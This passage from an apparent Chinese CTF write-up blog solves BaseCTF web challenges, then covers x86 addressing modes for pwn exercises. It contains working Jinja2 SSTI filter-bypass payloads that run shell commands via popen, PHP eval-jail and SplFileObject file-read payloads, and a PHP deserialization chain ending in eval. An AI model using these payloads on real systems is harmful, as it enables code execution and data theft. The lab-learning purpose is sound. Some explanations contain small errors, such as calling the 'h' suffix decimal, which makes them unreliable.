%&#125;</span><br><span class="line"><span class="string">&#x27;%c&#x27;</span>%(<span class="number">47</span>)：</span><br><span class="line"><span class="string">&#x27;%c&#x27;</span> 是一个格式化字符串，表示将后面的值转换为对应的字符。</span><br><span class="line"><span class="number">47</span> 是 ASCII 码值，对应的字符是 /。</span><br><span class="line"><span class="string">&#x27;%c&#x27;</span> % (<span class="number">47</span>) 的结果是 /。</span><br><span class="line"></span><br><span class="line">利用环境变量的值：在类 Unix 系统（如 Linux 和 macOS）中，OLDPWD 是一个环境变量，用于存储用户最后一次 切换目录之前的路径。</span><br><span class="line">BaseCTF&#123;%<span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cl&#x27;</span><span class="string">&#x27;ass_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_ba&#x27;</span><span class="string">&#x27;se_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_subcla&#x27;</span><span class="string">&#x27;sses_&#x27;</span><span class="string">&#x27;_&#x27;</span>]</span><br><span class="line">()[<span class="number">137</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_in&#x27;</span><span class="string">&#x27;it_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_glo&#x27;</span><span class="string">&#x27;bals_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;po&#x27;</span><span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;env&#x27;</span>)[<span class="string">&#x27;rea&#x27;</span><span class="string">&#x27;d&#x27;</span>]())%&#125;</span><br><span class="line">看到OLDPWD=/</span><br><span class="line">BaseCTF&#123;%<span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cl&#x27;</span><span class="string">&#x27;ass_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_ba&#x27;</span><span class="string">&#x27;se_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_subcla&#x27;</span><span class="string">&#x27;sses_&#x27;</span><span class="string">&#x27;_&#x27;</span>]</span><br><span class="line">()[<span class="number">137</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_in&#x27;</span><span class="string">&#x27;it_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_glo&#x27;</span><span class="string">&#x27;bals_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;po&#x27;</span><span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;cd $OLDPWD;cat</span></span><br><span class="line"><span class="string">flag&#x27;</span>)[<span class="string">&#x27;rea&#x27;</span><span class="string">&#x27;d&#x27;</span>]())%&#125;</span><br><span class="line"></span><br><span class="line">expr substr 是 Linux 中 expr 命令的一个字符串操作功能，用于从给定的字符串中截取子字符串。它的基本语法如下：</span><br><span class="line">expr substr &lt;string&gt; &lt;start&gt; &lt;length&gt;截取从start开始的length个字符</span><br><span class="line">我们如果输入pwd的话是会出现一个/的，我们可以截取下来</span><br><span class="line">BaseCTF&#123;%<span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>[<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_cl&#x27;</span><span class="string">&#x27;ass_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_ba&#x27;</span><span class="string">&#x27;se_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_subcla&#x27;</span><span class="string">&#x27;sses_&#x27;</span><span class="string">&#x27;_&#x27;</span>]</span><br><span class="line">()[<span class="number">137</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_in&#x27;</span><span class="string">&#x27;it_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;_&#x27;</span><span class="string">&#x27;_glo&#x27;</span><span class="string">&#x27;bals_&#x27;</span><span class="string">&#x27;_&#x27;</span>][<span class="string">&#x27;po&#x27;</span><span class="string">&#x27;pen&#x27;</span>](<span class="string">&#x27;a=`pwd`;a=`substr</span></span><br><span class="line"><span class="string">$a 1 1`;cd $a;cat flag&#x27;</span>)[<span class="string">&#x27;rea&#x27;</span><span class="string">&#x27;d&#x27;</span>]())%&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BaseCTF&#123;% set chr= &#x27;&#x27;[&#x27;_&#x27;&#x27;_cl&#x27;&#x27;ass_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_ba&#x27;&#x27;se_&#x27;&#x27;_&#x27;] [&#x27;_&#x27;&#x27;_subcla&#x27;&#x27;sses_&#x27;&#x27;_&#x27;]()[137][&#x27;_&#x27;&#x27;_in&#x27;&#x27;it_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_glo&#x27;&#x27;bals_&#x27;&#x27;_&#x27;] [&#x27;_&#x27;&#x27;_bui&#x27;&#x27;ltins_&#x27;&#x27;_&#x27;][&#x27;chr&#x27;]%&#125; &#123;% set cmd=&#x27;cat &#x27;~chr(47)~&#x27;flag&#x27; %&#125;&#123;%print(&#x27;&#x27;[&#x27;_&#x27;&#x27;_cl&#x27;&#x27;ass_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_ba&#x27;&#x27;se_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_subcla&#x27;&#x27;sses_&#x27;&#x27;_&#x27;]()[137] [&#x27;_&#x27;&#x27;_in&#x27;&#x27;it_&#x27;&#x27;_&#x27;][&#x27;_&#x27;&#x27;_glo&#x27;&#x27;bals_&#x27;&#x27;_&#x27;][&#x27;po&#x27;&#x27;pen&#x27;](cmd)[&#x27;rea&#x27;&#x27;d&#x27;]())%&#125;</span><br></pre></td></tr></table></figure>
<h1>ez_php_jail</h1>
<p>题目信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DT最怕坐牢了...但是包吃包住啊！</span><br></pre></td></tr></table></figure>
<p>源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;hint.html&quot;);</span><br><span class="line">$Jail = $_GET[&#x27;Jail_by.Happy&#x27;];</span><br><span class="line"></span><br><span class="line">if($Jail == null) die(&quot;Do You Like My Jail?&quot;);</span><br><span class="line"></span><br><span class="line">function Like_Jail($var) &#123;</span><br><span class="line">    if (preg_match(&#x27;/(`|\$|a|c|s|require|include)/i&#x27;, $var)) &#123;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (Like_Jail($Jail)) &#123;</span><br><span class="line">    eval($Jail);</span><br><span class="line">    echo &quot;Yes! you escaped from the jail! LOL!&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;You will Jail in your life!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;\n&quot;;</span><br><span class="line"></span><br><span class="line">// 在HTML解析后再输出PHP源代码</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>感觉得出一个php函数的字典</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?Jail[by.Happy=print_r(glob(&#x27;/f*&#x27;));</span><br><span class="line">?Jail[by.Happy=print_r(implode(glob(&#x27;/f*&#x27;)));//这里来读取数组里面的内容</span><br><span class="line">?Jail[by.Happy=highlight_file(implode(glob(&#x27;/f*&#x27;)));</span><br><span class="line">?Jail[by.Happy=highlight_file(glob(&#x27;/f*&#x27;)[0]);</span><br></pre></td></tr></table></figure>
<h1><strong>flag直接读取不就行了？</strong></h1>
<p>题目信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">你应该能找到flag吧？</span><br></pre></td></tr></table></figure>
<p>题目源码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(&#x27;index.php&#x27;);</span><br><span class="line"># 我把flag藏在一个secret文件夹里面了，所以要学会遍历啊~</span><br><span class="line">error_reporting(0);</span><br><span class="line">$J1ng = $_POST[&#x27;J&#x27;];</span><br><span class="line">$Hong = $_POST[&#x27;H&#x27;];</span><br><span class="line">$Keng = $_GET[&#x27;K&#x27;];</span><br><span class="line">$Wang = $_GET[&#x27;W&#x27;];</span><br><span class="line">$dir = new $Keng($Wang);</span><br><span class="line">foreach($dir as $f) &#123;</span><br><span class="line">    echo($f . &#x27;&lt;br&gt;&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">echo new $J1ng($Hong);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这道题应该是基于下面这个来自PHPmanual当中的例子</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> // 循环 ext/spl/examples/ 目录里所有 *.php 文件</span><br><span class="line">// 并打印文件名和文件尺寸</span><br><span class="line"> $it  = new  DirectoryIterator ( &quot;glob://ext/spl/examples/*.php&quot; );</span><br><span class="line">foreach( $it  as  $f ) &#123;</span><br><span class="line">     printf ( &quot;%s: %.1FK\n&quot; ,  $f -&gt; getFilename (),  $f -&gt; getSize ()/ 1024 );</span><br><span class="line">&#125;</span><br><span class="line"> ?&gt; </span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?K=DirectoryIterator&amp;W=glob:///secret/*</span><br></pre></td></tr></table></figure>
<p>可以看到f11444g.php</p>
<p>然后就是读取他的内容，但是呢，源码当中没有给我们引号，例如</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_file(&#x27;index.php&#x27;);</span><br></pre></td></tr></table></figure>
<p>那我们可以添加引号进去吗？这里不行…php://filter/convert.base64-encode/resource=也不行</p>
<p>但是我看SplFileObject也需要引号啊…</p>
<p>不懂…</p>
<p>本地实操</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(&#x27;index.php&#x27;);</span><br><span class="line"># 我把flag藏在一个secret文件夹里面了，所以要学会遍历啊~</span><br><span class="line">error_reporting(0);</span><br><span class="line">$J1ng = $_POST[&#x27;J&#x27;];</span><br><span class="line">$Hong = $_POST[&#x27;H&#x27;];</span><br><span class="line">$Keng = $_GET[&#x27;K&#x27;];</span><br><span class="line">$Wang = $_GET[&#x27;W&#x27;];</span><br><span class="line">$dir = new $Keng($Wang);</span><br><span class="line">foreach($dir as $f) &#123;</span><br><span class="line">    echo($f . &#x27;&lt;br&gt;&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">$a = new $J1ng($Hong);</span><br><span class="line">echo $a;</span><br><span class="line">if($a == null)&#123;</span><br><span class="line">    echo &#x27;0&#x27;;</span><br><span class="line">&#125;elseif($a != null)&#123;</span><br><span class="line">    echo &#x27;1&#x27;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &#x27;?&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt; flag.php</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?K=DirectoryIterator&amp;W=glob:///phpstudy_pro/www/f*</span><br><span class="line">J=SplFileObject&amp;H=/phpstudy_pro/www/flag.php</span><br><span class="line">这里是可以拿到flag.php的内容的		&lt;?php flag&#123;&#125;?&gt;</span><br><span class="line">试了好多次，发现这里拿到的目录是根目录，我们必须切换到相应的目录才可以拿到flag</span><br></pre></td></tr></table></figure>
<p>所以，如果是属性的话就不需要引号。但是在这里include\highlight_file都不行，只能用SplFileObject，为啥？</p>
<p>因为涉及到了代码层面的理解…</p>
<p><code>file_get_contents</code>、<code>fopen</code>等函数无法通过动态调用的方式使用，因为它们不是类，无法通过<code>new</code>关键字实例化。</p>
<table>
<thead>
<tr>
<th style="text-align:left">类名</th>
<th style="text-align:left">功能描述</th>
<th style="text-align:left">适用场景</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>SplFileObject</code></td>
<td style="text-align:left">以面向对象的方式读取文件内容，支持逐行读取等操作</td>
<td style="text-align:left">普通文本文件</td>
</tr>
<tr>
<td style="text-align:left"><code>DOMDocument</code></td>
<td style="text-align:left">加载和解析XML或HTML文件，读取文件内容</td>
<td style="text-align:left">XML或HTML文件</td>
</tr>
<tr>
<td style="text-align:left"><code>SimpleXMLElement</code></td>
<td style="text-align:left">加载和解析XML文件，读取文件内容</td>
<td style="text-align:left">XML文件</td>
</tr>
<tr>
<td style="text-align:left"><code>ZipArchive</code></td>
<td style="text-align:left">打开ZIP文件并读取其中的文件内容</td>
<td style="text-align:left">ZIP压缩文件</td>
</tr>
<tr>
<td style="text-align:left"><code>Phar</code></td>
<td style="text-align:left">打开PHAR文件并读取其中的文件内容</td>
<td style="text-align:left">PHAR压缩文件</td>
</tr>
<tr>
<td style="text-align:left"><code>GlobIterator</code></td>
<td style="text-align:left">遍历文件系统中匹配特定模式的文件，并读取文件内容</td>
<td style="text-align:left">文件系统遍历</td>
</tr>
<tr>
<td style="text-align:left"><code>DirectoryIterator</code></td>
<td style="text-align:left">遍历目录中的文件，并读取文件内容</td>
<td style="text-align:left">目录遍历</td>
</tr>
<tr>
<td style="text-align:left"><code>StreamWrapper</code></td>
<td style="text-align:left">自定义文件操作逻辑，读取文件内容</td>
<td style="text-align:left">需要自定义文件操作逻辑的场景</td>
</tr>
</tbody>
</table>
<ul>
<li><strong>类</strong>：通过<code>new</code>关键字实例化为对象，然后通过对象调用方法。</li>
<li><strong>函数</strong>：直接调用，不能通过<code>new</code>关键字实例化。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BaseCTF&#123;88afc285-5a00-490c-b520-5970acd4cf1d&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__file__);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">substrstr</span>(<span class="params"><span class="variable">$data</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$start</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;[&quot;</span>);</span><br><span class="line">    <span class="variable">$end</span> = <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$data</span>, <span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">mb_substr</span>(<span class="variable">$data</span>, <span class="variable">$start</span> + <span class="number">1</span>, <span class="variable">$end</span> - <span class="number">1</span> - <span class="variable">$start</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$end</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$start</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start=<span class="variable">$start</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;end = <span class="variable language_">$this</span>-&gt;start;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfer/i&#x27;</span>,<span class="variable">$this</span>-&gt;username))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Hacker！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c-&gt;<span class="title function_ invoke__">c</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;C&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">T</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$t</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;t-&gt;t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">F</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;f-&gt;f);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$e</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;e)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">R</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$r</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ez_ser.from_you&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ctf</span> = <span class="keyword">new</span> <span class="title class_">Hacker</span>(<span class="string">&#x27;&#123;&#123;&#123;&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;ez_ser.from_you&#x27;</span>].<span class="string">&#x27;&#125;&#125;&#125;&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\[|\]/i&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;substr&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NONONO!!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$pre</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;substr&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;substr&#x27;</span>]:<span class="string">&quot;substr&quot;</span>;</span><br><span class="line">    <span class="variable">$ser_ctf</span> = <span class="title function_ invoke__">substrstr</span>(<span class="variable">$pre</span>.<span class="string">&quot;[&quot;</span>.<span class="title function_ invoke__">serialize</span>(<span class="variable">$ctf</span>).<span class="string">&quot;]&quot;</span>);</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$ser_ctf</span>);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;杂鱼~杂鱼~&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Hacker</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$end</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$start</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;start=<span class="variable">$start</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;end = <span class="variable language_">$this</span>-&gt;start;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/ctfer/i&#x27;</span>,<span class="variable">$this</span>-&gt;username))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Hacker！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c-&gt;<span class="title function_ invoke__">c</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;C&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">T</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$t</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;t-&gt;t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">F</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;f-&gt;f);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$e</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;e)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">R</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$r</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;r);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>baseCtf</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn6-12</title>
    <url>/2025/01/19/pwn6-12/</url>
    <content><![CDATA[<h2 id="前置基础">前置基础</h2>
<h3 id="pwn6-pwn12知识点">pwn6-pwn12知识点</h3>
<p>数据的寻址方式:</p>
<p>​	1 指令和数据的寻址方式</p>
<p>​	2 数据寻址方式说明</p>
<p>​	3 立即寻址</p>
<p>​	4 直接寻址</p>
<p>​	5 （存储器）间接寻址</p>
<p>​	6 寄存器寻址</p>
<p>​	7 寄存器间接寻址</p>
<p>​	8 相对地址</p>
<p>​	9 相对基址寻址</p>
<p>​	10 相对变址寻址</p>
<p>​	11 相对基址变址寻址</p>
<p><strong>寄存器间接寻址</strong></p>
<p><strong>格式：[寄存器]</strong></p>
<p>说明：指令中指定一个寄存器，该寄存器中存放的是操作数的有效地址，通过访问该寄存器所指向的内存单元来获取操作数。例如在 8086 汇编语言中，MOV AX,[BX]，这里BX寄存器中存放的是一个内存地址，将该地址中的数据传送到AX寄存器中。</p>
<p><strong>基址寻址</strong></p>
<p><strong>格式：[基址寄存器 + 位移量]</strong></p>
<p>说明：以一个基址寄存器的内容为基准地址，再加上一个位移量来形成操作数的有效地址。如MOV AX,[BX + 10H]，BX是基址寄存器，10H是位移量，将BX寄存器中的值加上10H得到的地址中的数据传送到AX寄存器。</p>
<p><strong>变址寻址</strong></p>
<p><strong>格式：[变址寄存器 + 位移量]</strong></p>
<p>说明：与基址寻址类似，但使用变址寄存器来提供地址偏移量。例如MOV AX,[SI + 20H]，SI是变址寄存器，20H是位移量，把SI寄存器中的值加上20H所指向的内存单元中的数据传送到AX寄存器。</p>
<p><strong>基址变址寻址</strong></p>
<p><strong>格式：[基址寄存器 + 变址寄存器] 或 [基址寄存器 + 变址寄存器 + 位移量]</strong></p>
<p>说明：将基址寄存器和变址寄存器的内容相加，再加上可选的位移量来形成操作数的有效地址。例如在 8086 中MOV AX,[BX + SI] 或者MOV AX,[BX + SI + 30H]，通过这种方式可以更灵活地访问二维数组等数据结构。</p>
<p><strong>相对寻址</strong></p>
<p><strong>格式：[程序计数器 (PC) + 位移量]</strong></p>
<p>说明：以程序计数器当前的值为基准，加上一个位移量来形成转移目标地址。常用于程序的分支跳转指令，如JMP 10H[PC]，表示跳转到当前程序计数器的值加上10H后的地址处继续执行程序。</p>
<p><strong>间接间接寻址</strong></p>
<p><strong>格式：[[寄存器]]</strong></p>
<p>说明：先访问指令中指定的寄存器，该寄存器中存放的是另一个内存单元的地址，再通过这个地址去访问最终的操作数。例如MOV AX,[[BX]]，先取BX寄存器中的值作为一个地址，再取该地址中的值作为最终操作数的地址，将该最终地址中的数据传送到AX寄存器。</p>
<h3 id="pwn5">pwn5</h3>
<p>题目信息：立即寻址方式结束后eax寄存器的值为？</p>
<p><img src="/2025/01/19/pwn6-12/image-20250113120703387.png" alt="image-20250113120703387"></p>
<p>打开之后，没错，就是这个界面，刚开始的时候我以为这是我ida开错了</p>
<img src="/2025/01/19/pwn6-12/image-20250113120727880.png" alt="image-20250113120727880">
<p>eax\ebx\ecx\edx都在这里</p>
<p>我们需要eax</p>
<p><img src="/2025/01/19/pwn6-12/image-20250113120828151.png" alt="image-20250113120828151"></p>
<p>mov是移动的意思，这里指eax=0Bh（h是十进制的意思）</p>
<p>Add就是加的意思eax+=1BF48h</p>
<p>sub是subtract（减）的缩写</p>
<p>所以最终的eax=B+BF48-1=114514</p>
<p>Ctfshow{114514}</p>
<h3 id="pwn7">pwn7</h3>
<p>题目信息:寄存器寻址方式结束后edx寄存器的值为？</p>
<p><img src="/2025/01/19/pwn6-12/image-20250113121038920.png" alt="image-20250113121038920"></p>
<p>Ebx=36D</p>
<p>Edx=ebx</p>
<p>综上edx=36D</p>
<p>注意大小写</p>
<h3 id="pwn8">pwn8</h3>
<p>题目信息:直接寻址方式结束后ecx寄存器的值为？</p>
<p><img src="/2025/01/19/pwn6-12/image-20250113121123869.png" alt="image-20250113121123869"></p>
<p>Ecx=dword_80490E8</p>
<p>dword_80490E8的地址是0x80490E8(双击跟进dword_80490E8)</p>
<p><img src="/2025/01/19/pwn6-12/wps1.jpg" alt="img"></p>
<p>也就说把dword_80490E8的地址0x80490E8赋值给了ecx</p>
<p>{0x80490E8}</p>
<h3 id="pwn9">pwn9</h3>
<p>题目信息:寄存器间接寻址方式结束后eax寄存器的值为？</p>
